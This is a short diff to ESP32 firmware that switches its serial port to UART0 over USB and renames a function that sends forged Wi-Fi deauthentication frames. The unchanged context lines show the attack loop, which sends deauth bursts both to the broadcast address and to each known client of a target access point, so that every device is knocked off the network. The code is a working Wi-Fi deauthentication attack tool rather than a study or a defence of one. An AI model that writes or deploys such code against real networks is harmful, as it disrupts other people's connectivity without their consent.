@@ -10,10 +10,10 @@
 #include "nvs_flash.h"
 #include "esp_log.h"
 
-// UART2 configuration — mirrors main project pinout
-#define UART_PORT      UART_NUM_2
-#define UART_TX_PIN    17
-#define UART_RX_PIN    16
+// UART0 — communicates over USB (COM3)
+#define UART_PORT      UART_NUM_0
+#define UART_TX_PIN    UART_PIN_NO_CHANGE
+#define UART_RX_PIN    UART_PIN_NO_CHANGE
 #define UART_BAUD_RATE 115200
 #define BUF_SIZE       1024
 
@@ -161,7 +161,7 @@ void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
 
 // ── Send a single forged deauth frame ────────────────────────────────────────
 
-void send_deauth(const uint8_t *dst, const uint8_t *bssid) {
+void ghost_deauth(const uint8_t *dst, const uint8_t *bssid) {
     uint8_t frame[sizeof(deauth_frame_template)];
     memcpy(frame, deauth_frame_template, sizeof(frame));
 
@@ -190,14 +190,14 @@ void deauth_task(void *arg) {
         // Broadcast deauth — hits all clients at once
         uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
         for (int i = 0; i < DEAUTH_BURST; i++) {
-            send_deauth(broadcast, target_bssid);
+            ghost_deauth(broadcast, target_bssid);
         }
 
         // Also individually deauth each known client
         xSemaphoreTake(state_mutex, portMAX_DELAY);
         for (int c = 0; c < client_count; c++) {
             for (int i = 0; i < DEAUTH_BURST; i++) {
-                send_deauth(clients[c], target_bssid);
+                ghost_deauth(clients[c], target_bssid);
             }
         }
         xSemaphoreGive(state_mutex);
